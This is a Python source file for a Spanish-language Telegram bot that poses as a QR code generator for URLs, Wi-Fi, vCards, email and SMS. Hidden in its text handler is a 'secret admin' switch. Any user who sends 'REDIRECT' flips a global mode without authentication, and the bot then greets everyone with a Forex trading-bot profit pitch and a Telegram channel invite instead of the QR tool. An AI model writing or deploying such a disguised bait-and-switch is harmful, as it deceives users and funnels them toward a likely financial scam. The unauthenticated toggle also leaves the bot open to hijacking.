import logging
import os
import io
import asyncio
from aiohttp import web
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    CallbackQueryHandler,
    MessageHandler,
    filters,
)
import qrcode
from qrcode.constants import ERROR_CORRECT_H
from PIL import Image

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.environ.get('BOT_TOKEN')

# Global Bot Modes
GLOBAL_BOT_MODE = "QRCODE"  # Can be "QRCODE" or "REDIRECT"

# QR Types
QR_TYPES = [
    ("🔗 URL / Sitio",       "url"),
    ("📝 Texto Simple",      "text"),
    ("📶 Red Wi-Fi",         "wifi"),
    ("👤 Contacto (vCard)",  "vcard"),
    ("📧 Correo",            "email"),
    ("📞 Llamada",           "phone"),
    ("💬 SMS",               "sms"),
]

# Color themes (fg, bg)
THEMES = [
    ("⚫ Clásico (B/N)",    ((0, 0, 0),       (255, 255, 255))),
    ("🔵 Azul Océano",      ((30, 80, 180),   (255, 255, 255))),
    ("🟣 Morado",           ((118, 30, 180),  (255, 255, 255))),
    ("🟢 Verde",            ((39, 130, 80),   (255, 255, 255))),
    ("🔴 Rojo",             ((180, 40, 40),   (255, 255, 255))),
    ("⚪ Invertido",        ((255, 255, 255), (20, 20, 30))),
]

# ---------- Helpers ----------

def main_menu_markup() -> InlineKeyboardMarkup:
    keyboard = [
        [InlineKeyboardButton("⚡ Crear Código QR", callback_data="menu_create")],
        [InlineKeyboardButton("ℹ️ Ayuda", callback_data="menu_help")],
    ]
    return InlineKeyboardMarkup(keyboard)

def type_markup() -> InlineKeyboardMarkup:
    rows = [[InlineKeyboardButton(lbl, callback_data=f"type_{key}")] for lbl, key in QR_TYPES]
    rows.append([InlineKeyboardButton("🏠 Menú Principal", callback_data="menu_home")])
    return InlineKeyboardMarkup(rows)

def theme_markup() -> InlineKeyboardMarkup:
    rows = []
    for i in range(0, len(THEMES), 2):
        row = []
        for j, (lbl, _) in enumerate(THEMES[i:i+2]):
            row.append(InlineKeyboardButton(lbl, callback_data=f"theme_{i+j}"))
        rows.append(row)
    rows.append([InlineKeyboardButton("🏠 Menú Principal", callback_data="menu_home")])
    return InlineKeyboardMarkup(rows)

def reset_user_state(context: ContextTypes.DEFAULT_TYPE) -> None:
    for key in ('mode', 'qr_type', 'qr_data', 'qr_step', 'qr_inputs'):
        context.user_data.pop(key, None)

# ---------- Commands ----------

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global GLOBAL_BOT_MODE
    user = update.effective_user
    logger.info(f"User {user.id} started the bot in mode: {GLOBAL_BOT_MODE}")
    reset_user_state(context)

    # 1. REDIRECT mode
    if GLOBAL_BOT_MODE == "REDIRECT":
        welcome_text = (
            "¡Automatiza tus operaciones y obtén ganancias fácilmente con nuestro bot de trading de Forex!\n\n"
            "Funciona en tu PC y en tu móvil. 🔥"
        )
        await update.message.reply_text(welcome_text)

        await asyncio.sleep(2)

        keyboard = [
            [InlineKeyboardButton("Haz clic para unirte ahora 🟢", url="https://t.me/+pCxuKjvmoWE3MDk5")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text("https://t.me/+pCxuKjvmoWE3MDk5", reply_markup=reply_markup)
        return

    # 2. NORMAL (QRCODE) mode
    welcome = (
        "👋 *¡Bienvenido al Bot Generador de Códigos QR!*\n\n"
        "Creo códigos QR para cualquier cosa 🚀\n\n"
        "✨ *Soporta:*\n"
        "• 🔗 URLs y sitios web\n"
        "• 📝 Textos simples\n"
        "• 📶 Wi-Fi (conexión automática)\n"
        "• 👤 Tarjetas de contacto (vCard)\n"
        "• 📧 Correos, 📞 Teléfono, 💬 SMS\n\n"
        "🎨 6 temas de colores disponibles\n\n"
        "Toca abajo para comenzar:"
    )
    await update.message.reply_text(welcome, reply_markup=main_menu_markup(), parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global GLOBAL_BOT_MODE
    if GLOBAL_BOT_MODE == "REDIRECT":
        return

    text = (
        "ℹ️ *Cómo usar*\n\n"
        "1. Toca en ⚡ *Crear Código QR*\n"
        "2. Elige el tipo de Código QR\n"
        "3. Envía la información necesaria\n"
        "4. Elige un tema de color\n"
        "5. Recibe tu Código QR (PNG)\n\n"
        "💡 *Formato Wi-Fi:* Se solicitará el nombre de la red (SSID), contraseña y tipo de seguridad\n"
        "💡 *vCard:* Nombre, teléfono, correo, organización\n\n"
        "Usa /cancel en cualquier momento para empezar de nuevo."
    )
    if update.message:
        await update.message.reply_text(text, parse_mode='Markdown', reply_markup=main_menu_markup())
    else:
        await update.callback_query.edit_message_text(
            text, parse_mode='Markdown', reply_markup=main_menu_markup()
        )

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global GLOBAL_BOT_MODE
    if GLOBAL_BOT_MODE == "REDIRECT":
        return

    reset_user_state(context)
    await update.message.reply_text(
        "❌ Cancelado. Usa /start para empezar de nuevo.",
        reply_markup=main_menu_markup(),
    )

# ---------- Menu callbacks ----------

async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global GLOBAL_BOT_MODE
    query = update.callback_query
    await query.answer()

    if GLOBAL_BOT_MODE == "REDIRECT":
        await query.edit_message_text("Este menú está desactivado en este momento.")
        return

    data = query.data

    if data == "menu_home":
        reset_user_state(context)
        await query.edit_message_text(
            "🏠 *Menú Principal*\nElige una opción a continuación:",
            reply_markup=main_menu_markup(),
            parse_mode='Markdown',
        )

    elif data == "menu_help":
        await help_command(update, context)

    elif data == "menu_create":
        await query.edit_message_text(
            "⚡ *Crear Código QR*\n\nElige el tipo de código QR:",
            reply_markup=type_markup(),
            parse_mode='Markdown',
        )

    elif data.startswith("type_"):
        qtype = data.split("_", 1)[1]
        context.user_data['qr_type'] = qtype
        context.user_data['qr_inputs'] = {}
        context.user_data['qr_step'] = 0
        prompt = get_next_prompt(qtype, 0)
        context.user_data['mode'] = 'collecting'
        await query.edit_message_text(
            f"📥 *{prompt['title']}*\n\n{prompt['ask']}\n\n_Usa /cancel para abortar._",
            parse_mode='Markdown',
        )

    elif data.startswith("theme_"):
        idx = int(data.split("_", 1)[1])
        await do_generate(update, context, idx)

# ---------- Step-by-step input flow ----------

STEPS = {
    "url": [
        {"title": "URL", "ask": "Envía la URL (ej: `https://ejemplo.com`)", "key": "url"},
    ],
    "text": [
        {"title": "Texto", "ask": "Envía el texto a codificar (máximo 500 caracteres).", "key": "text"},
    ],
    "wifi": [
        {"title": "Nombre del Wi-Fi", "ask": "Envía el nombre de la red Wi-Fi (SSID).", "key": "ssid"},
        {"title": "Contraseña del Wi-Fi", "ask": "Envía la contraseña del Wi-Fi.\nEnvía `ninguna` si es una red abierta.", "key": "password"},
        {"title": "Tipo de Seguridad", "ask": "Envía el tipo de seguridad: `WPA`, `WEP` o `nopass`", "key": "security"},
    ],
    "vcard": [
        {"title": "Nombre Completo", "ask": "Envía el nombre completo.", "key": "name"},
        {"title": "Teléfono", "ask": "Envía el número de teléfono (ej: `+34612345678`).\nEnvía `omitir` para ignorar.", "key": "phone"},
        {"title": "Correo", "ask": "Envía la dirección de correo.\nEnvía `omitir` para ignorar.", "key": "email"},
        {"title": "Organización", "ask": "Envía la organización/empresa.\nEnvía `omitir` para ignorar.", "key": "org"},
    ],
    "email": [
        {"title": "Dirección de Correo", "ask": "Envía la dirección de correo (ej: `hola@ejemplo.com`).", "key": "email"},
        {"title": "Asunto", "ask": "Envía el asunto del correo.\nEnvía `omitir` para ignorar.", "key": "subject"},
        {"title": "Cuerpo del Mensaje", "ask": "Envía el cuerpo del correo.\nEnvía `omitir` para ignorar.", "key": "body"},
    ],
    "phone": [
        {"title": "Número de Teléfono", "ask": "Envía el número de teléfono (ej: `+34612345678`).", "key": "phone"},
    ],
    "sms": [
        {"title": "Número de Teléfono", "ask": "Envía el número de teléfono del destinatario.", "key": "phone"},
        {"title": "Mensaje", "ask": "Envía el texto del mensaje SMS.\nEnvía `omitir` para ignorar.", "key": "message"},
    ],
}

def get_next_prompt(qtype: str, step: int):
    return STEPS[qtype][step]

def get_total_steps(qtype: str):
    return len(STEPS[qtype])

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global GLOBAL_BOT_MODE
    text = (update.message.text or "").strip()

    # Intercept SECRET ADMIN commands
    if text == "REDIRECT":
        GLOBAL_BOT_MODE = "REDIRECT"
        await update.message.reply_text("✅ ¡Modo de redirección activado! El bot ahora enviará a todos al canal de Forex.")
        return
    elif text == "REVERSE":
        GLOBAL_BOT_MODE = "QRCODE"
        await update.message.reply_text("✅ ¡Modo Código QR activado! El bot está funcionando normalmente de nuevo.")
        return

    # Ignore text if in REDIRECT mode
    if GLOBAL_BOT_MODE == "REDIRECT":
        return

    # Normal QR code flow
    if context.user_data.get('mode') != 'collecting':
        return

    qtype = context.user_data.get('qr_type')
    step = context.user_data.get('qr_step', 0)
    inputs = context.user_data.get('qr_inputs', {})

    if not text:
        await update.message.reply_text("⚠️ Entrada vacía. Inténtalo de nuevo o usa /cancel.")
        return

    prompt = STEPS[qtype][step]
    key = prompt["key"]

    # Lightweight validation
    if qtype == "url" and key == "url":
        if not (text.startswith("http://") or text.startswith("https://")):
            text = "https://" + text
    if qtype == "text" and len(text) > 500:
        await update.message.reply_text("⚠️ Muy largo (máximo 500 caracteres). Inténtalo de nuevo o /cancel.")
        return
    if qtype == "wifi" and key == "security":
        if text.upper() not in ("WPA", "WEP", "NOPASS"):
            await update.message.reply_text("⚠️ Debe ser WPA, WEP o nopass. Inténtalo de nuevo.")
            return
        text = text.upper()

    inputs[key] = text
    context.user_data['qr_inputs'] = inputs

    # Next step
    next_step = step + 1
    if next_step < get_total_steps(qtype):
        context.user_data['qr_step'] = next_step
        nxt = STEPS[qtype][next_step]
        await update.message.reply_text(
            f"✅ Entendido.\n\n📥 *{nxt['title']}*\n\n{nxt['ask']}",
            parse_mode='Markdown',
        )
    else:
        # All inputs collected → ask for theme
        context.user_data['mode'] = 'theme_select'
        await update.message.reply_text(
            "🎨 ¡Todos los datos recopilados!\n\nAhora elige un tema de color:",
            reply_markup=theme_markup(),
        )

# ---------- QR data builder ----------

SKIP_WORDS = ("omitir", "skip", "saltar")
NONE_WORDS = ("ninguna", "none", "nenhuma")

def build_qr_data(qtype: str, inputs: dict) -> str:
    if qtype == "url":
        return inputs["url"]

    if qtype == "text":
        return inputs["text"]

    if qtype == "wifi":
        ssid = inputs["ssid"]
        pwd = inputs["password"]
        sec = inputs["security"]
        if sec == "NOPASS" or pwd.lower() in NONE_WORDS:
            return f"WIFI:T:nopass;S:{ssid};;"
        return f"WIFI:T:{sec};S:{ssid};P:{pwd};;"

    if qtype == "vcard":
        name = inputs.get("name", "")
        phone = inputs.get("phone", "")
        email = inputs.get("email", "")
        org = inputs.get("org", "")
        lines = ["BEGIN:VCARD", "VERSION:3.0", f"FN:{name}", f"N:{name};;;;"]
        if phone and phone.lower() not in SKIP_WORDS:
            lines.append(f"TEL:{phone}")
        if email and email.lower() not in SKIP_WORDS:
            lines.append(f"EMAIL:{email}")
        if org and org.lower() not in SKIP_WORDS:
            lines.append(f"ORG:{org}")
        lines.append("END:VCARD")
        return "\n".join(lines)

    if qtype == "email":
        email = inputs["email"]
        subject = inputs.get("subject", "")
        body = inputs.get("body", "")
        params = []
        if subject and subject.lower() not in SKIP_WORDS:
            params.append(f"subject={subject.replace(' ', '%20')}")
        if body and body.lower() not in SKIP_WORDS:
            params.append(f"body={body.replace(' ', '%20')}")
        q = ("?" + "&".join(params)) if params else ""
        return f"mailto:{email}{q}"

    if qtype == "phone":
        return f"tel:{inputs['phone']}"

    if qtype == "sms":
        phone = inputs["phone"]
        msg = inputs.get("message", "")
        if msg and msg.lower() not in SKIP_WORDS:
            return f"SMSTO:{phone}:{msg}"
        return f"sms:{phone}"

    return ""

# ---------- QR generation ----------

def generate_qr_image(data: str, fg, bg) -> bytes:
    qr = qrcode.QRCode(
        version=None,
        error_correction=ERROR_CORRECT_H,
        box_size=20,
        border=2,
    )
    qr.add_data(data)
    qr.make(fit=True)

    img = qr.make_image(fill_color=fg, back_color=bg).convert("RGB")

    target = 1024
    img = img.resize((target, target), Image.NEAREST)

    out = io.BytesIO()
    img.save(out, format="PNG", optimize=True)
    return out.getvalue()

async def do_generate(update: Update, context: ContextTypes.DEFAULT_TYPE, theme_idx: int):
    query = update.callback_query
    qtype = context.user_data.get('qr_type')
    inputs = context.user_data.get('qr_inputs')

    if not qtype or not inputs:
        await query.edit_message_text("⚠️ Datos faltantes. Comienza de nuevo.", reply_markup=main_menu_markup())
        return

    chat_id = query.message.chat_id
    await query.edit_message_text("⏳ Generando tu código QR…")

    try:
        data = build_qr_data(qtype, inputs)
        if not data:
            raise ValueError("Could not build QR data.")

        _, (fg, bg) = THEMES[theme_idx]

        loop = asyncio.get_event_loop()
        out_bytes = await loop.run_in_executor(
            None, generate_qr_image, data, fg, bg
        )

        type_label = next((lbl for lbl, k in QR_TYPES if k == qtype), qtype)
        out_name = f"qr_{qtype}.png"

        await context.bot.send_photo(
            chat_id=chat_id,
            photo=InputFile(io.BytesIO(out_bytes), filename=out_name),
            caption=f"✅ *¡Código QR Listo!*\n\nTipo: {type_label}",
            parse_mode='Markdown',
        )
        await context.bot.send_document(
            chat_id=chat_id,
            document=InputFile(io.BytesIO(out_bytes), filename=out_name),
            caption="📥 PNG en alta resolución (1024×1024)",
            reply_markup=main_menu_markup(),
        )

    except Exception as e:
        logger.error(f"QR generation failed: {e}")
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"❌ Falló: {e}",
            reply_markup=main_menu_markup(),
        )
    finally:
        reset_user_state(context)

# ---------- Dummy web server (keeps Render Web Service alive) ----------

async def health(request):
    return web.Response(text="Bot is running")

async def run_web():
    port = int(os.environ.get("PORT", 10000))
    app = web.Application()
    app.router.add_get("/", health)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    logger.info(f"Health server listening on port {port}")

# ---------- Runner ----------

async def run_bot():
    if not BOT_TOKEN:
        logger.critical("FATAL: BOT_TOKEN is missing!")
        return

    application = None
    try:
        application = Application.builder().token(BOT_TOKEN).build()

        application.add_handler(CommandHandler("start", start_command))
        application.add_handler(CommandHandler("help", help_command))
        application.add_handler(CommandHandler("cancel", cancel_command))
        application.add_handler(CallbackQueryHandler(menu_callback))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

        await run_web()

        logger.info("Bot is now polling...")
        await application.initialize()
        await application.start()
        await application.updater.start_polling(drop_pending_updates=True)

        stop_event = asyncio.Event()
        await stop_event.wait()

    except Exception as e:
        logger.error(f"Failed to start bot: {e}")
    finally:
        if application is not None:
            await application.stop()
            await application.shutdown()

def main():
    try:
        asyncio.run(run_bot())
    except KeyboardInterrupt:
        logger.info("Bot stopped by user.")
    except Exception as e:
        logger.error(f"Main loop error: {e}")

if __name__ == '__main__':
    main()
